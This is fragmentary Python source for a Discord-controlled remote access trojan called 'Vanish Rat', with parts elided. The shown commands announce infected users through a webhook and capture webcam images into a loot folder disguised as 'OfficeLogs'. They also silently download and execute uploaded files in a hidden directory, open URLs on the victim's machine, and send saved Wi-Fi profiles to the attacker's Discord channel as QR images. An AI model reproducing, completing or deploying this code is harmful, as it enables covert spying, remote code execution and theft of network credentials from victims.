...
payload = {
    ...
    "embeds": [
        {
            "title": "",
            "description": f"**{username}** Ran Vanish-Hook",
            "color": 16711680,
            "image": {
                "url": WEBHOOK_AVATAR 
            }
...
async def on_ready():
    for guild in bot.guilds:
        me = guild.me
        if me.nick != "Vanish Rat":
            try:
                await me.edit(nick="Vanish Rat")
            except Exception as e:
                print(f"Failed to set nickname in {guild.name}: {e}")
    if hasattr(bot, 'already_ready'):
        return
    bot.already_ready = True
    await bot.change_presence(activity=discord.Game(name="Vanish Rat"))
...
async def webcam(ctx):
    try:
        ...
        loot_dir = os.path.join(os.path.expandvars("%USERPROFILE%\\OneDrive\\Documents"), "OfficeLogs")
        os.makedirs(loot_dir, exist_ok=True)
        path = os.path.join(loot_dir, "webcam.png")
...
@bot.command()
async def up(ctx):
    """Receives and executes uploaded file(s) silently in a hidden directory."""
    try:
...
async def ssp(ctx):
    try:
        ...
        await ctx.send("🎶 Spotify is now cursed to relaunch forever (once).")
    except Exception as e:
...
async def  openurl(ctx, *, url):
    try:
        ...
        await ctx.send(f"Failed to open")
    ...
    try:
        ...
        for profile in profiles:
            try:
                ...
                file_path = os.path.join(os.getenv("TEMP"), f"{profile}_wifi_qr.png")
                img.save(file_path)
                await ctx.send(file=discord.File(file_path))
                os.remove(file_path)
            except Exception as e:
                await ctx.send(f"Failed to generate QR for {profile}: {e}")
    except Exception as e:
        await ctx.send(f"Wi-Fi QR generation failed: {e}")
